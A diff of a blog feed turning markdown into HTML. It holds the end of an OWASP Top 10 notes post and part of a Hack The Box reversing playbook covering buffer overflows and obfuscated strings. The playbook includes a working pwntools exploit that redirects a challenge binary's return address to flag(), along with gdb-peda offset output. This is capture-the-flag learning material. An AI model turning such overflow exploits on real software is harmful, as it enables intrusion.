-&lt;a href=&quot;https://owasp.org/Top10/A05_2021-Security_Misconfiguration/&quot;&gt;https://owasp.org/Top10/A05_2021-Security_Misconfiguration/&lt;/a&gt;
+<p><a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">https://owasp.org/Top10/A05_2021-Security_Misconfiguration/</a></p>
 
-This topic is very broad and might include things like:
+<p>This topic is very broad and might include things like:</p>
 
-- Default users, passwords
-- Unprotected paths of the application (remember nginx off-by-slash vulnerability)
-- Stack traces revealing information to the user
+<ul>
+  <li>Default users, passwords</li>
+  <li>Unprotected paths of the application (remember nginx off-by-slash vulnerability)</li>
+  <li>Stack traces revealing information to the user</li>
+</ul>
 
-### Vulnerable and Outdated Components
+<h3 id="vulnerable-and-outdated-components">Vulnerable and Outdated Components</h3>
 
-&lt;a href=&quot;https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/&quot;&gt;https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/&lt;/a&gt;
+<p><a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/</a></p>
 
-Using old libraries might cause the application to be vulnerable to new attacks that recent versions of the library fix
+<p>Using old libraries might cause the application to be vulnerable to new attacks that recent versions of the library fix</p>
 
-When you are exploring this attack vector, check the repository of the library (if open source) and look for commits for the next versions. If you see something looking like a security fix, it&apos;s worth trying to replicate it in your setup.
+<p>When you are exploring this attack vector, check the repository of the library (if open source) and look for commits for the next versions. If you see something looking like a security fix, it’s worth trying to replicate it in your setup.</p>
 
-### Identification and Authentication Failures
+<h3 id="identification-and-authentication-failures">Identification and Authentication Failures</h3>
 
-&lt;a href=&quot;https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/&quot;&gt;https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/&lt;/a&gt;
+<p><a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/</a></p>
 
-Examples:
+<p>Examples:</p>
 
-- Default/weak password
-- Allowing brute force attacks to guess username/password
+<ul>
+  <li>Default/weak password</li>
+  <li>Allowing brute force attacks to guess username/password</li>
+</ul>
 
-### Software and Data Integrity Failures
+<h3 id="software-and-data-integrity-failures">Software and Data Integrity Failures</h3>
 
-&lt;a href=&quot;https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/&quot;&gt;https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/&lt;/a&gt;
+<p><a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/</a></p>
 
-Application that relies on plugins, libraries, etc.. from third-party must verify the integrity of the component. This also applies to the user input. If the user can see and modified a serialized payload, that payload should be handled with extra care. Additionally, CI/CD pipeline must be well secured, otherwise the attackers might modified the shipped software.
+<p>Application that relies on plugins, libraries, etc.. from third-party must verify the integrity of the component. This also applies to the user input. If the user can see and modified a serialized payload, that payload should be handled with extra care. Additionally, CI/CD pipeline must be well secured, otherwise the attackers might modified the shipped software.</p>
 
-### Security Logging and Monitoring Failures
+<h3 id="security-logging-and-monitoring-failures">Security Logging and Monitoring Failures</h3>
 
-&lt;a href=&quot;https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/&quot;&gt;https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/&lt;/a&gt;
+<p><a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/">https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/</a></p>
 
-Not enough monitoring for thins like an excessive number of failed login attemps, etc...
+<p>Not enough monitoring for thins like an excessive number of failed login attemps, etc…</p>
 
-### Server-Side Request Forgery (SSRF)
+<h3 id="server-side-request-forgery-ssrf">Server-Side Request Forgery (SSRF)</h3>
 
-&lt;a href=&quot;https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/&quot;&gt;https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/&lt;/a&gt;
+<p><a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/">https://owasp.org/Top10/A10<em>2021-Server-Side_Request_Forgery</em>%28SSRF%29/</a></p>
 
-This happens when an application fetches a resource from a third-pary from the input provided by a user. For instance, in a template engine, the legitimate users might include an image stored in their webserver. However, an attack might include their own crafted version of the image that includes malicious code.</content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="owasp" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="owasp" /><summary type="html">I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the knowledge I’ve got related with OWASP Top 10 vulnerabilities.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Reversing playbook</title><link href="https://www.agalera.eu/reversing-playbook/" rel="alternate" type="text/html" title="Reversing playbook" /><published>2023-01-04T00:00:00+01:00</published><updated>2023-01-04T00:00:00+01:00</updated><id>https://www.agalera.eu/reversing-playbook</id><content type="html" xml:base="https://www.agalera.eu/reversing-playbook/">I have started playing around in &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;https://www.hackthebox.com&lt;/a&gt; platform and I&apos;ll use this article to save all the steps I take to complete the challenges related with reversing.
+<p>This happens when an application fetches a resource from a third-pary from the input provided by a user. For instance, in a template engine, the legitimate users might include an image stored in their webserver. However, an attack might include their own crafted version of the image that includes malicious code.</p>]]></content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="owasp" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="owasp" /><summary type="html"><![CDATA[I keep this page as a reference to the compile the knowledge I have got related with OWASP Top 10 vulnerabilities]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Reversing playbook</title><link href="https://www.agalera.eu/reversing-playbook/" rel="alternate" type="text/html" title="Reversing playbook" /><published>2023-01-04T00:00:00-06:00</published><updated>2023-01-04T00:00:00-06:00</updated><id>https://www.agalera.eu/reversing-playbook</id><content type="html" xml:base="https://www.agalera.eu/reversing-playbook/"><![CDATA[<p>I have started playing around in <a href="https://www.hackthebox.com/">https://www.hackthebox.com</a> platform and I’ll use this article to save all the steps I take to complete the challenges related with reversing.</p>
 
-&lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
+<p><!--more--></p>
 
-## Table of contents
-1. [Introduction](#introduction)
-2. [Buffer overflow](#buffer-overflow)
-3. [Obfuscated code](#obfuscated)
-4. [String format vulnerability](#string-format)
-5. [Security flags](#flags)
-6. [ASLR](#aslr)
-7. [one gadget](#one-gadget)
-8. [Overwrite Global Object Table](#override-got)
+<h2 id="table-of-contents">Table of contents</h2>
+<ol>
+  <li><a href="#introduction">Introduction</a></li>
+  <li><a href="#buffer-overflow">Buffer overflow</a></li>
+  <li><a href="#obfuscated">Obfuscated code</a></li>
+  <li><a href="#string-format">String format vulnerability</a></li>
+  <li><a href="#flags">Security flags</a></li>
+  <li><a href="#aslr">ASLR</a></li>
+  <li><a href="#one-gadget">one gadget</a></li>
+  <li><a href="#override-got">Overwrite Global Object Table</a></li>
+</ol>
+
+<h3 id="introduction-">Introduction <a name="introduction"></a></h3>
+
+<p>There are a series of challenges where you are given a binary file and you need to be able to obtain the flag inside. In order to do so, you need to perform Reverse engineering. In order to do so, you should use a debugger or a decompiler (or both).</p>
+
+<p>The first step is to use regularly and pay attention to the strings appearing in the UI. Later, we can search those strings in the decompiler.</p>
+
+<p>One useful tool to perform this kind of analysis is ghidra: <a href="https://github.com/NationalSecurityAgency/ghidra">https://github.com/NationalSecurityAgency/ghidra</a>.</p>
+
+<p>For instance, you can search for references, memory addresses, search for strings, etc..</p>
+
+<p>Another interesting tool is <code class="language-plaintext highlighter-rouge">gdb</code>, the gnu debugger. More on this to come, when i’m not familiar.</p>
+
+<p>To debug Windows binaries, you can use <code class="language-plaintext highlighter-rouge">ollydbg</code>, analyse the code and place the breakpoints in the interesting addresses.</p>
 
-### Introduction &lt;a name=&quot;introduction&quot;&gt;&lt;/a&gt;
+<h3 id="buffer-overflow-">Buffer overflow <a name="buffer-overflow"></a></h3>
 
-There are a series of challenges where you are given a binary file and you need to be able to obtain the flag inside. In order to do so, you need to perform Reverse engineering. In order to do so, you should use a debugger or a decompiler (or both).
+<p>In order to understand this attack, first we need to understand how the memory works in the computers.</p>
 
-The first step is to use regularly and pay attention to the strings appearing in the UI. Later, we can search those strings in the decompiler.
+<p>We first need to understand that memory has the following regions:</p>
 
-One useful tool to perform this kind of analysis is ghidra: &lt;a href=&quot;https://github.com/NationalSecurityAgency/ghidra&quot;&gt;https://github.com/NationalSecurityAgency/ghidra&lt;/a&gt;.
+<table>
+  <tbody>
+    <tr>
+      <td>Stack</td>
+      <td>stores function local variables and information about function calls: return address, arguments, etc..</td>
+    </tr>
+    <tr>
+      <td>Heap</td>
+      <td>stores the dynamic memory. Used by malloc, etc…</td>
+    </tr>
+    <tr>
+      <td>BSS</td>
+      <td>stores the uninitialized static/global variables</td>
+    </tr>
+    <tr>
+      <td>Data</td>
+      <td>stores the static/global variables</td>
+    </tr>
+    <tr>
+      <td>Text</td>
+      <td>read only, stores the executable code</td>
+    </tr>
+  </tbody>
+</table>
 
-For instance, you can search for references, memory addresses, search for strings, etc..
+<p>Inside the stack, a new stack frame is created for every function execution. Inside a stack frame, we can see:</p>
 
-Another interesting tool is `gdb`, the gnu debugger. More on this to come, when i&apos;m not familiar.
+<table>
+  <tbody>
+    <tr>
+      <td>Function arguments</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>Return address</td>
+      <td>where to go when the execution ends</td>
+    </tr>
+    <tr>
+      <td>Previous frame pointer</td>
+      <td>to know what is the stack frame of the function calling this function</td>
+    </tr>
+    <tr>
+      <td>Local variables</td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
 
-To debug Windows binaries, you can use `ollydbg`, analyse the code and place the breakpoints in the interesting addresses.
+<p>Take this functions as example:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="kt">void</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
+  <span class="cm">/* The following statement will result in buffer overflow */</span>
+  <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">str</span> <span class="o">=</span> <span class="s">"This is definitely longer than 12"</span><span class="p">;</span>
+  <span class="n">foo</span><span class="p">(</span><span class="n">str</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
 
+<p>The stack frame for foo() will look like this:</p>
 
-### Buffer overflow &lt;a name=&quot;buffer-overflow&quot;&gt;&lt;/a&gt;
+<table>
+  <tbody>
+    <tr>
+      <td>arguments: str (pointer)</td>
+    </tr>
+    <tr>
+      <td>Return address</td>
+    </tr>
+    <tr>
+      <td>Previous Frame Pointer</td>
+    </tr>
+    <tr>
+      <td>Local variables <br /><br />buffer[11]<br />…<br />buffer[1]</td>
+    </tr>
+  </tbody>
+</table>
 
-In order to understand this attack, first we need to understand how the memory works in the computers.
+<p>In this case, we can keep adding data into the buffer until we reach the memory address of the return address. 
+Then, we can tell the program to jump to any function that we want.</p>
 
-We first need to understand that memory has the following regions:
+<p>Knowing that, buffer overflow technique consists in three stages:</p>
 
-| Stack | stores function local variables and information about function calls: return address, arguments, etc..
-| Heap  | stores the dynamic memory. Used by malloc, etc...
-| BSS   | stores the uninitialized static/global variables
-| Data  | stores the static/global variables
-| Text  | read only, stores the executable code
+<h3 id="overflow-the-stack-pointer">Overflow the stack pointer</h3>
 
-Inside the stack, a new stack frame is created for every function execution. Inside a stack frame, we can see:
+<p>when a function does not limit the input characters, it can happen that the user inputs more bytes than the expected, e.g: <code class="language-plaintext highlighter-rouge">gets</code> function:</p>
 
-| Function arguments |
-| Return address | where to go when the execution ends
-| Previous frame pointer | to know what is the stack frame of the function calling this function
-| Local variables |
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
 
-Take this functions as example:
-```c
-#include &lt;string.h&gt;
-void foo(char *str)
-{
-  char buffer[12];
-  /* The following statement will result in buffer overflow */
-  strcpy(buffer, str);
-}
-int main()
-{
-  char *str = &quot;This is definitely longer than 12&quot;;
-  foo(str);
-  return 1;
-}
-```
-
-The stack frame for foo() will look like this:
-
-| arguments: str (pointer) |
-| Return address |
-| Previous Frame Pointer |
-| Local variables &lt;br&gt;&lt;br&gt;buffer[11]&lt;br&gt;...&lt;br&gt;buffer[1]|
-
-In this case, we can keep adding data into the buffer until we reach the memory address of the return address. 
-Then, we can tell the program to jump to any function that we want.
-
-Knowing that, buffer overflow technique consists in three stages:
-
-### Overflow the stack pointer
-
-when a function does not limit the input characters, it can happen that the user inputs more bytes than the expected, e.g: `gets` function:
-
-```c
-void vuln(void)
-
-{
-  char local_bc [180];
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">local_bc</span> <span class="p">[</span><span class="mi">180</span><span class="p">];</span>
   
-  gets(local_bc);
-  puts(local_bc);
-  return;
-}
-```
-In this case, if the user inputs 200 chars, the program will fail with segmentation fault and the data will be injected in some unknown region of the stack.
+  <span class="n">gets</span><span class="p">(</span><span class="n">local_bc</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="n">local_bc</span><span class="p">);</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>In this case, if the user inputs 200 chars, the program will fail with segmentation fault and the data will be injected in some unknown region of the stack.</p>
 
-### Reach to the return address
+<h3 id="reach-to-the-return-address">Reach to the return address</h3>
 
-Knowing that the function is vulnerable to buffer overflow, we can craft a special payload that change the return address to make it jump where we want.
+<p>Knowing that the function is vulnerable to buffer overflow, we can craft a special payload that change the return address to make it jump where we want.</p>
 
-In order to do this, the first thing we need to do is find the offset on the input data in order to write to the return address.
+<p>In order to do this, the first thing we need to do is find the offset on the input data in order to write to the return address.</p>
 
-Using ghidra we can find easily the value of the return function as it will be the next instruction just after the invocation to our target function, so you will need to calculate the payload using those values.
+<p>Using ghidra we can find easily the value of the return function as it will be the next instruction just after the invocation to our target function, so you will need to calculate the payload using those values.</p>
 
-You can do it in a less manual way using `gdb-peda`:
+<p>You can do it in a less manual way using <code class="language-plaintext highlighter-rouge">gdb-peda</code>:</p>
 
-Knowing that the buffer has 180 chars, let&apos;s suppose that will 200 chars will overflow it, let&apos;s create a pattern of 200 chars:
+<p>Knowing that the buffer has 180 chars, let’s suppose that will 200 chars will overflow it, let’s create a pattern of 200 chars:</p>
 
-`pattern_create 200 bof.txt`
+<p><code class="language-plaintext highlighter-rouge">pattern_create 200 bof.txt</code></p>
 
-and input it to the program:
+<p>and input it to the program:</p>
 
-`r &lt; pattern.txt`
+<p><code class="language-plaintext highlighter-rouge">r &lt; pattern.txt</code></p>
 
-When the program crashes, we&apos;ll see the registers:
-```bash
-You know who are 0xDiablos: 
-AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
+<p>When the program crashes, we’ll see the registers:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You know <span class="nb">who </span>are 0xDiablos: 
+AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
 
 Program received signal SIGSEGV, Segmentation fault.
 
-[----------------------------------registers-----------------------------------]
+<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
 EAX: 0xc9 
-EBX: 0x76414158 (&apos;XAAv&apos;)
-ECX: 0xf7fa09b4 --&gt; 0x0 
+EBX: 0x76414158 <span class="o">(</span><span class="s1">'XAAv'</span><span class="o">)</span>
+ECX: 0xf7fa09b4 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
 EDX: 0x1 
-ESI: 0xffffcf94 --&gt; 0xffffd165 (&quot;/home/gal/workspace/hack-the-box/boxes/you-know-0x-diables/vuln&quot;)
-EDI: 0xf7ffcb80 --&gt; 0x0 
-EBP: 0x41594141 (&apos;AAYA&apos;)
-ESP: 0xffffceb0 (&quot;ZAAxAAyA&quot;)
-EIP: 0x41417741 (&apos;AwAA&apos;)
-EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
-[-------------------------------------code-------------------------------------]
-Invalid $PC address: 0x41417741
-[------------------------------------stack-------------------------------------]
-0000| 0xffffceb0 (&quot;ZAAxAAyA&quot;)
-0004| 0xffffceb4 (&quot;AAyA&quot;)
-0008| 0xffffceb8 --&gt; 0xf7fbeb00 --&gt; 0xf7d8fcd4 (&quot;GCC_3.0&quot;)
-0012| 0xffffcebc --&gt; 0x3e8 
-0016| 0xffffcec0 --&gt; 0xffffcee0 --&gt; 0x1 
-0020| 0xffffcec4 --&gt; 0xf7f9f000 --&gt; 0x229dac 
-0024| 0xffffcec8 --&gt; 0xf7ffd020 --&gt; 0xf7ffda40 --&gt; 0x0 
-0028| 0xffffcecc --&gt; 0xf7d96519 --&gt; 0x8310c483 
-[------------------------------------------------------------------------------]
+ESI: 0xffffcf94 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd165 <span class="o">(</span><span class="s2">"/home/gal/workspace/hack-the-box/boxes/you-know-0x-diables/vuln"</span><span class="o">)</span>
+EDI: 0xf7ffcb80 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+EBP: 0x41594141 <span class="o">(</span><span class="s1">'AAYA'</span><span class="o">)</span>
+ESP: 0xffffceb0 <span class="o">(</span><span class="s2">"ZAAxAAyA"</span><span class="o">)</span>
+EIP: 0x41417741 <span class="o">(</span><span class="s1">'AwAA'</span><span class="o">)</span>
+EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
+<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
+Invalid <span class="nv">$PC</span> address: 0x41417741
+<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
+0000| 0xffffceb0 <span class="o">(</span><span class="s2">"ZAAxAAyA"</span><span class="o">)</span>
+0004| 0xffffceb4 <span class="o">(</span><span class="s2">"AAyA"</span><span class="o">)</span>
+0008| 0xffffceb8 <span class="nt">--</span><span class="o">&gt;</span> 0xf7fbeb00 <span class="nt">--</span><span class="o">&gt;</span> 0xf7d8fcd4 <span class="o">(</span><span class="s2">"GCC_3.0"</span><span class="o">)</span>
+0012| 0xffffcebc <span class="nt">--</span><span class="o">&gt;</span> 0x3e8 
+0016| 0xffffcec0 <span class="nt">--</span><span class="o">&gt;</span> 0xffffcee0 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
+0020| 0xffffcec4 <span class="nt">--</span><span class="o">&gt;</span> 0xf7f9f000 <span class="nt">--</span><span class="o">&gt;</span> 0x229dac 
+0024| 0xffffcec8 <span class="nt">--</span><span class="o">&gt;</span> 0xf7ffd020 <span class="nt">--</span><span class="o">&gt;</span> 0xf7ffda40 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0028| 0xffffcecc <span class="nt">--</span><span class="o">&gt;</span> 0xf7d96519 <span class="nt">--</span><span class="o">&gt;</span> 0x8310c483 
+<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
 Legend: code, data, rodata, value
-0x41417741 in ?? ()
-```
-The interesting one is `EIP` as it is the register that points to the next instruction. Note that if you change the payload, the value of the EIP pointer will change as well.
+0x41417741 <span class="k">in</span> ?? <span class="o">()</span>
+</code></pre></div></div>
+<p>The interesting one is <code class="language-plaintext highlighter-rouge">EIP</code> as it is the register that points to the next instruction. Note that if you change the payload, the value of the EIP pointer will change as well.</p>
 
-Now, we can use `pattern_offset` to obtain exactly the number of characters to reach to Return address:
-```bash
-gdb-peda$ pattern_offset 0x41417741
+<p>Now, we can use <code class="language-plaintext highlighter-rouge">pattern_offset</code> to obtain exactly the number of characters to reach to Return address:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset 0x41417741
 1094809409 found at offset: 188
-```
+</code></pre></div></div>
 
-Now we know that if we write exactly 188 chars, the next content will be written to the return address and we can make the program jump to where we want.
+<p>Now we know that if we write exactly 188 chars, the next content will be written to the return address and we can make the program jump to where we want.</p>
 
-### Write the exploit
+<h3 id="write-the-exploit">Write the exploit</h3>
 
-In the case I&apos;m working on the exploit just need to call another function in the code. In order to so, I&apos;ll use python `pwntools`: &lt;a href=&quot;https://github.com/Gallopsled/pwntools&quot;&gt;https://github.com/Gallopsled/pwntools&lt;/a&gt; which helps a lot on these kind of things.
+<p>In the case I’m working on the exploit just need to call another function in the code. In order to so, I’ll use python <code class="language-plaintext highlighter-rouge">pwntools</code>: <a href="https://github.com/Gallopsled/pwntools">https://github.com/Gallopsled/pwntools</a> which helps a lot on these kind of things.</p>
 
-```python
-from pwn import *
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-context.update(arch=&quot;i386&quot;, os=&quot;linux&quot;)
+<span class="n">context</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">"i386"</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">"linux"</span><span class="p">)</span>
 
-elf = ELF(&quot;./vuln&quot;)
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./vuln"</span><span class="p">)</span>
 
-# offset to reach right before return address&apos;s location
-offset = b&quot;A&quot; * 188
+<span class="c1"># offset to reach right before return address's location
+</span><span class="n">offset</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">188</span>
 
-# craft exploit: offset + flag() + padding + parameter 1 + parameter 2
-exploit = offset + p32(elf.symbols[&apos;flag&apos;], endian=&quot;little&quot;) + p32(0x90909090) + p32(0xdeadbeef, endian=&quot;little&quot;) + p32(0xc0ded00d, endian=&quot;little&quot;)
+<span class="c1"># craft exploit: offset + flag() + padding + parameter 1 + parameter 2
+</span><span class="n">exploit</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'flag'</span><span class="p">],</span> <span class="n">endian</span><span class="o">=</span><span class="s">"little"</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x90909090</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s">"little"</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xc0ded00d</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s">"little"</span><span class="p">)</span>
 
-r = elf.process()
-r.sendlineafter(&quot;:&quot;, exploit)
-r.interactive()
-```
-Remember that we are jumping to flag() using RET. This means flag() will think itself have a return address. Therefore, we should pad with any 4 bytes of content before we write the 2 parameters.
+<span class="n">r</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">":"</span><span class="p">,</span> <span class="n">exploit</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Remember that we are jumping to flag() using RET. This means flag() will think itself have a return address. Therefore, we should pad with any 4 bytes of content before we write the 2 parameters.</p>
 
-### Obfusctaed code &lt;a name=&quot;obfuscated&quot;&gt;&lt;/a&gt;
+<h3 id="obfusctaed-code-">Obfusctaed code <a name="obfuscated"></a></h3>
 
-Sometimes, when trying to reverse the code, you might see strings that look very odd, e.g:
+<p>Sometimes, when trying to reverse the code, you might see strings that look very odd, e.g:</p>
 
-`3734203635203636203132322036352036382034382036352037342031`.
+<p><code class="language-plaintext highlighter-rouge">3734203635203636203132322036352036382034382036352037342031</code>.</p>
 
-This might be some string buf obfuscated somehow. So far, I found this kind of simple de-obfuscation (the plan is to keep updating this with more obfuscation techniques):
+<p>This might be some string buf obfuscated somehow. So far, I found this kind of simple de-obfuscation (the plan is to keep updating this with more obfuscation techniques):</p>
 
-- hex to decimal &gt; decimal to char &gt; decode all string in base64:
+<ul>
+  <li>hex to decimal &gt; decimal to char &gt; decode all string in base64:</li>
+</ul>
 
-```python
-import binascii
-import base64
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">binascii</span>
+<span class="kn">import</span> <span class="nn">base64</span>
 
-def dec_to_chr(str):
-    return &quot;&quot;.join([chr(int(s)) for s in str.decode(&apos;utf-8&apos;).split(&apos; &apos;)])
+<span class="k">def</span> <span class="nf">dec_to_chr</span><span class="p">(</span><span class="nb">str</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">))</span> <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)])</span>
 
-base64text = &quot;&quot;
-base64text = base64text + dec_to_chr(binascii.unhexlify(&quot;3734203635203636203132322036352036382034382036352037342031&quot;) + binascii.unhexlify(&quot;31392036352035312036352036382039392036352037362031303320363520353120363520363820383120363520373620313033&quot;))
-base64text = base64text + dec_to_chr(binascii.unhexlify(&quot;3635203631&quot;))
-print(base64.b64decode(base64text).decode())
-$s=&apos;77.74.
-```
-In this case, this looks like the begining of a script trying to connect to an IP address.
+<span class="n">base64text</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">base64text</span> <span class="o">=</span> <span class="n">base64text</span> <span class="o">+</span> <span class="n">dec_to_chr</span><span class="p">(</span><span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="s">"3734203635203636203132322036352036382034382036352037342031"</span><span class="p">)</span> <span class="o">+</span> <span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="s">"31392036352035312036352036382039392036352037362031303320363520353120363520363820383120363520373620313033"</span><span class="p">))</span>
+<span class="n">base64text</span> <span class="o">=</span> <span class="n">base64text</span> <span class="o">+</span> <span class="n">dec_to_chr</span><span class="p">(</span><span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="s">"3635203631"</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">base64text</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
+<span class="err">$</span><span class="n">s</span><span class="o">=</span><span class="s">'77.74.
+</span></code></pre></div></div>
+<p>In this case, this looks like the begining of a script trying to connect to an IP address.</p>
 
-### String format vulnerability &lt;a name=&quot;string-format&quot;&gt;&lt;/a&gt;
+<h3 id="string-format-vulnerability-">String format vulnerability <a name="string-format"></a></h3>
 
-Some pieces of unsecure code, will print whatever the user is coding, see:
+<p>Some pieces of unsecure code, will print whatever the user is coding, see:</p>
 
-```c
-__isoc99_scanf(&quot;%299s&quot;,local_148);
-printf(local_148);
-```
